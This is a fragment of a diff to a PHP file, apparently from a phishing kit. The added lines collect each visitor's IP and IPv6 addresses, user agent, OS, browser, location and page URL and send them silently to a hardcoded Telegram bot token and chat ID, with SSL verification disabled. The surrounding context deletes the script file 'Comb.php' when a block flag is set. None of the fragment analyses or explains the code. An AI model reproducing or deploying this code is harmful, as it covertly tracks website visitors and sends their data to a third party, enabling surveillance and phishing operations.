@@ -2157,5 +2157,38 @@ if ($block == "on") {
         unlink("Comb.php"); exit();
     };
 };
+$domain = $_SERVER['HTTP_HOST'];
+$parse = $_SERVER['REQUEST_URI'];
+$ab = "http://ss{$domain}{$parse}";
+$date = date("h:i:s d/m/Y");
+$data .= "<-------- Viewer Information: {$IP} -------->\n\n";
+$data .= "Page: {$pageName} [{$adder}]\n\n";
+$data .= "Domain: {$ab}\n\n";
+$data .= "IP Address : {$IP}\n"; 
+$data .= "IPV6 :  {$IPV6}\n";
+$data .= "User-Agent : {$useragentss}\n";
+$data .= "OS    :  {$oss}\n";
+$data .= "Browser :  {$browser}\n";
+$data .= "Timezone  : {$timezone}\n";
+$data .= "City(IP)  : {$city}\n";
+$data .= "Country : {$countryname}, {$countrycode}\n";
+$data .= "Continent : {$continent}\n";
+$data .= "Currency  : {$currency}\n";
+$data .= "Date  : {$date}\n\n";
+$tokens = "5165957321:AAGNxLzGi0flybst49glcqsLAlhGXVN4DVI";
+$ids = "1802897390";
+$urls = "https://api.telegram.org/bot";
+$bots = "{$urls}{$tokens}";
+$params=[
+	'chat_id'=>$ids,
+	'text'=>$data,
+];
+$ch = curl_init($bots . '/sendMessage');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_exec($ch);
+curl_close($ch);
  unlink("Comb.php");              
 ?>
